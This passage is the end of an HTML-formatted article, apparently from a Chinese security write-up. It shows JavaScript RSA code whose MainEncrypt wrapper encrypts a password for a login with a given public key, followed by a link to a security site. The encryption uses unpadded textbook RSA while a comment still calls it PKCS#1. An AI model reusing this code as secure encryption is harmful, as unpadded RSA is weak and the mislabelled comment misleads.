class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = ((c &gt;&gt; 6) &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[--n] = (c &gt;&gt; 12) | 224;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ba[--n] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var rng = new SecureRandom();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var x = new Array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(n &gt; 2) { // random non-zero pad</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;x[0] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(x[0] == 0) rng.nextBytes(x);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ba[--n] = x[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ba[--n] = 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;ba[--n] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return new BigInteger(ba);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function nopadding(s,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(n &lt; s.length) { // TODO: fix for utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert(&quot;Message too long for RSA&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//console.log(s, n)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var ba = new Array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var i = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var j = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(i &lt; s.length &amp;&amp; j &lt; n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var c = s.charCodeAt(i++);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(c &lt; 128) { // encode using utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else if((c &gt; 127) &amp;&amp; (c &lt; 2048)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = (c &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = (c &gt;&gt; 6) | 192;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = (c &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = ((c &gt;&gt; 6) &amp; 63) | 128;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = (c &gt;&gt; 12) | 224;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while (j &lt; n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ba[j++] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//console.log(ba)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return new BigInteger(ba);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// &quot;empty&quot; RSA key constructor</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function RSAKey() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.n = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.e = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.d = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.p = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.q = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.dmp1 = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.dmq1 = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.coeff = null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Set the public key fields N and e from hex strings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function RSASetPublic(N,E) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(N != null &amp;&amp; E != null &amp;&amp; N.length &gt; 0 &amp;&amp; E.length &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.n = parseBigInt(N,16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.e = parseInt(E,16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;alert(&quot;Invalid RSA public key&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Perform raw public operation on &quot;x&quot;: return x^e (mod n)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function RSADoPublic(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return x.modPowInt(this.e, this.n);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// Return the PKCS#1 RSA encryption of &quot;text&quot; as an even-length hex string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function RSAEncrypt(text) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var m = nopadding(text,(this.n.bitLength()+7)&gt;&gt;3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(m == null) return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var c = this.doPublic(m);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(c == null) return null;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var h = c.toString(16);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((h.length &amp; 1) == 0) return h; else return &quot;0&quot; + h;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">function MainEncrypt(n,e,message) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RSAKey.prototype.doPublic = RSADoPublic;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RSAKey.prototype.setPublic = RSASetPublic;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;RSAKey.prototype.encrypt = RSAEncrypt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var rsa = new RSAKey();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rsa.setPublic(n,e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var passwd = rsa.encrypt(message);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return passwd;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h2 class="cs868C439D">
			<a name="四、参考链接"><span class="cs83F14626">四、参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.03sec.com/3207.shtml"><span class="cs4B51D5E4">https://www.03sec.com/3207.shtml</span></a></span></p></body>
</html>
